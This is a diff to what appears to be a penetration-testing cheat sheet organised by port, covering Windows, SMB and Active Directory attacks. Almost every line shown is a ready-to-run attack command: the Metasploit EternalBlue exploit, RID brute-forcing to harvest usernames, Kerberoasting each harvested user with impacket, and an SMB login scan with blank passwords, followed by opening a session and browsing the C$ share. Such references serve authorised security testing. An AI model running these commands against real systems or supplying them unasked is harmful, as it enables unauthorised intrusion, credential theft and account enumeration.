@@ -125,8 +125,8 @@ ldapsearch -H ldap://$DC/ -D "$DOM\$USERNAME" -w '$PASSWORD' -b "DC=xxxxxx,DC=xx
 
 [*] (445) SMB
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
+(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' | tee -a usernames &)
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
-nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))'
 impacket-samrdump "$TARGET"
 
 [*] (2049) NFS
@@ -380,7 +380,7 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
 
 [*] (445) SMB
-msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set CreateSession true; run"
+msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
 shares -i C$
 cd programdata
